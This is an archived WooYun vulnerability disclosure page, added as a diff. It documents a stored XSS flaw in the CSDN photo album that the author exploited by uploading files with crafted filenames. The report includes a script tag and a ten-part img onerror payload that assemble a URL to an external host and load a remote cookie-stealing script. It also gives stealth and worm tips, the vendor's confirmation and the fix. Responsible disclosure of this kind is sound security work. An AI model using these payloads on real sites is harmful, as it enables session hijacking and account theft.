@@ -1,0 +1,257 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		CSDN XSS漏洞第二弹：我如何突破长度和斜线限制打cookie  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		CSDN XSS漏洞第二弹：我如何突破长度和斜线限制打cookie  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/橙夏">橙夏</a> 
+</li><li>提交时间：		2013-07-29 23:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-30：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-19：	细节向普通白帽子公开<br/>
+									2013-08-29：	细节向实习白帽子公开<br/>
+									2013-09-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CSDN某处过滤用户输入不周全，只防止了一种漏洞的产生，导致xss，可打cookie。<br />
+求rank - -</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">话说我继续在CSDN空间挖洞，然后看到了“相册”这一功能，有没有什么漏洞呢？<br />
+<br />
+<br />
+<br />
+0、试着上传了一张图片。<br />
+<br />
+</p><p class="detail"><a href="../images/29225420f77268f69a1b94189c9ea50cdb723ae7.png" target="_blank"><img src="../images/29225420f77268f69a1b94189c9ea50cdb723ae7.png" alt="a00.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1、在http://my.csdn.net/my/album/upload中上传一张图片，抓包，把filename的后缀改为.php，但是失败了；<br />
+<br />
+</p><p class="detail"><a href="../images/2922543463617dabc6e3e4aeccf66635c68d0513.png" target="_blank"><img src="../images/2922543463617dabc6e3e4aeccf66635c68d0513.png" alt="a01.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2、回到相册首页（http://my.csdn.net/my/album）进入相册，突然发现图片的标题和去掉扩展名的filename一模一样。<br />
+<br />
+</p><p class="detail"><a href="../images/292255033975ecd650f293849984b1d577994d2b.png" target="_blank"><img src="../images/292255033975ecd650f293849984b1d577994d2b.png" alt="a02.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3、这样会导致xss吗？把filename改成&lt;nyan&gt;.gif试试，发现并没有被过滤。<br />
+<br />
+</p><p class="detail"><a href="../images/292255259f34329545255e2f2d658fe99cf2cb3e.png" target="_blank"><img src="../images/292255259f34329545255e2f2d658fe99cf2cb3e.png" alt="a03.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4、赶紧的上个&lt;script src=//mikuxss.sinaapp.com/12CmMi&gt;&lt;/script&gt;……等等？标题怎么变成了script&gt;？<br />
+<br />
+</p><p class="detail"><a href="../images/292255468368b0b604957ae8b01d3d2525afd941.png" target="_blank"><img src="../images/292255468368b0b604957ae8b01d3d2525afd941.png" alt="a04.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5、经多次测试，服务器貌似使用了basename()之类的函数，只会输出最后一个斜线后的内容，而且有长度限制，超出限制的话请求会被拒绝。<br />
+<br />
+<br />
+<br />
+6、构造N条语句均失败后，回到相册，看了看源码，这些输出非常有规律，很整齐；<br />
+<br />
+</p><p class="detail"><a href="../images/29225610343dfa5f58c13e6bf2d21a597f5a10fc.png" target="_blank"><img src="../images/29225610343dfa5f58c13e6bf2d21a597f5a10fc.png" alt="a06.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7、于是把一句代码分割为10份，倒序上传：<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx=&#039;http:&#039;&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;ac=String.fromCharCode&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=ac(47)+ac(47)&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=&#039;mikuxss&#039;&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=&#039;.sinaapp&#039;&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=&#039;.com&#039;&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=ac(47)&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;mkx+=&#039;12CmMi&#039;&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;ac=$.getScript&quot;&gt;<br />
+<br />
+&lt;img src=1 onerror=&quot;ac(mkx)&quot;&gt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+8、效果图（http://my.csdn.net/u011311506/album/show/179805）<br />
+<br />
+</p><p class="detail"><a href="../images/29225627a78a4f614bedfa14bcaee73cfd8f718f.png" target="_blank"><img src="../images/29225627a78a4f614bedfa14bcaee73cfd8f718f.png" alt="a08.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+（注：为防止危害，mikuxss.sinaapp.com/12CmMi已无法使用）<br />
+<br />
+（那个，图是测试用的，这个洞和V家没有关系。。。） </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">用我的小号登录<br />
+<br />
+</p><p class="detail"><a href="../images/29225754a5708bc38f9724be77901da31a50e520.png" target="_blank"><img src="../images/29225754a5708bc38f9724be77901da31a50e520.png" alt="a09-1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功获取cookie<br />
+<br />
+</p><p class="detail"><a href="../images/2922581549b8339ee5dc15ae783e8641b6654186.png" target="_blank"><img src="../images/2922581549b8339ee5dc15ae783e8641b6654186.png" alt="a09-2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">htmlentities或htmlspecialchars，可不要指哪修哪<br />
+<br />
+<br />
+<br />
+img标签里完全可以插入style=&quot;display:none&quot;增加迷惑性<br />
+<br />
+邀请别人看自己相册是很正常的请求，此洞也可蠕虫化，望重视<br />
+<br />
+求rank - - </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/橙夏" title="橙夏">橙夏</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-032759" title="CSDN XSS漏洞第二弹：我如何突破长度和斜线限制打cookie">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-07-30 09:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">尽快修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-07-30：已经修复</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="32759";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
